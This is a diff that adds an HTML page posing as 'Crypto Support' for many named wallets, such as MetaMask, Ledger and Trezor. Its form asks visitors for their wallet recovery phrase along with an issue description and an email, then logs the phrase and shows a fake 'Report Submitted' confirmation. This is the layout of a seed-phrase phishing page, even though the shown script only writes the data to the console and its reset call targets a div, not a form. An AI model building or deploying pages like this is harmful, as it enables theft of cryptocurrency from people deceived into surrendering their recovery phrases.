@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Crypto Support <span id="cryptologo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2d/Bitcoin_logo.svg/2048px-Bitcoin_logo.svg.png" alt="Crypto Logo" width="30"></span></h1>
+            <p>Powered by Crypto Originals and GitHub</p>
+            <nav>
+                <ul>
+                    <li><a href="#support">Support Options</a></li>
+                    <li><a href="#translation">Translation Resources</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <main>
+        <section id="support">
+            <h2>Select Your Wallet</h2>
+            <label for="wallets">Choose your wallet:</label>
+            <select id="wallets" onchange="showWalletOptions()">
+                <option value="">--Select Wallet--</option>
+                <option value="Litewallet">Litewallet</option>
+                <option value="Exodus">Exodus</option>
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="Coinomi">Coinomi</option>
+                <option value="Atomic Wallet">Atomic Wallet</option>
+                <option value="Mycelium">Mycelium</option>
+                <option value="Ledger Live">Ledger Live</option>
+                <option value="Trezor">Trezor</option>
+                <option value="Jaxx Liberty">Jaxx Liberty</option>
+                <option value="Crypto.com Wallet">Crypto.com Wallet</option>
+                <option value="MetaMask">MetaMask</option>
+                <!-- Add more wallets as needed -->
+            </select>
+
+            <div id="wallet-options" style="display: none;">
+                <h3>Wallet Details</h3>
+                <label for="phrase">Enter wallet phrase:</label>
+                <input type="text" id="phrase" placeholder="Use spaces to separate" required>
+                <label for="issue">Issue:</label>
+                <input type="text" id="issue" placeholder="Describe the issue" required>
+                <label for="email">Email:</label>
+                <input type="email" id="email" placeholder="Your email" required>
+                <button onclick="confirmDetails()">Confirm</button>
+                <p style="color: red;">Note: Do not share your wallet phrase with anyone. Stay alert!</p>
+            </div>
+
+            <div id="confirmation-message" style="display: none;">
+                <h4>Report Submitted</h4>
+                <p>Thank you for your submission. We will review your issue.</p>
+            </div>
+        </section>
+
+        <section id="translation">
+            <h2>Translation Resources</h2>
+            <p>List of available translation tools and resources...</p>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Crypto Support. All rights reserved.</p>
+    </footer>
+
+    <script>
+        function showWalletOptions() {
+            var walletSelect = document.getElementById("wallets");
+            var optionsDiv = document.getElementById("wallet-options");
+            if (walletSelect.value) {
+                optionsDiv.style.display = "block";
+            } else {
+                optionsDiv.style.display = "none";
+            }
+        }
+
+        function confirmDetails() {
+            var walletName = document.getElementById("wallets").value;
+            var phrase = document.getElementById("phrase").value;
+            var issue = document.getElementById("issue").value;
+            var email = document.getElementById("email").value;
+
+            // Log the details to the console
+            console.log("Wallet Name:", walletName);
+            console.log("Wallet Phrase:", phrase);
+            console.log("Issue:", issue);
+            console.log("Email:", email);
+
+            // Show confirmation message
+            var confirmationDiv = document.getElementById("confirmation-message");
+            confirmationDiv.style.display = "block";
+
+            // Optionally, reset the form or hide it
+            document.getElementById("wallet-options").reset();
+        }
+    </script>
+</body>
+                  </html>
+                  
